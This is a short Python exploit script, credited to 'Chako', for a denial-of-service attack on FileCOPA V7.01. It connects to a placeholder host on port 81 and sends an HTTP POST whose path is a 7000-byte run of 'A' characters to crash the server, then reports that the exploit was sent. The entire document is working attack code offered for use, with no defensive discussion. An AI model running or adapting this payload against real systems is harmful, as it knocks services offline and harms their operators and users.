#!/usr/bin/python

import socket
import sys


PAYLOAD = "\x41" * 7000


print("\n\n[+] FileCOPA V7.01 HTTP POST Denial Of Service")
print("[+] Version: V7.01")
print("[+] Chako\n\n\n")

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('www.example.com',81))

s.send("POST /" + PAYLOAD + "/ HTTP/1.0\r\n\r\n")


s.close()
print("[!] Done! Exploit successfully sent\n")


